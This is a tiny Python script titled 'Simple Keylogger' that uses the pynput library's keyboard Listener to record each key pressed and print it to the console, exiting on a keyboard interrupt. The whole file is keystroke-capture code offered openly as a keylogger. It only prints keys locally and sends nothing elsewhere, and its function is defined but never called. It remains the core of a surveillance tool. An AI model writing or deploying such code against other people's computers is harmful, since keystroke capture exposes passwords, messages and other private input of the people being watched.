# Simple Keylogger
from pynput.keyboard import Listener

def changed(key):
	print("key - ", key, ' is pressed')

def on_press(function=changed):
	with Listener(function) as l:
		try:
			l.join()
		except KeyboardInterrupt:
			print('\n[ LOG ] - EXIT.\n')
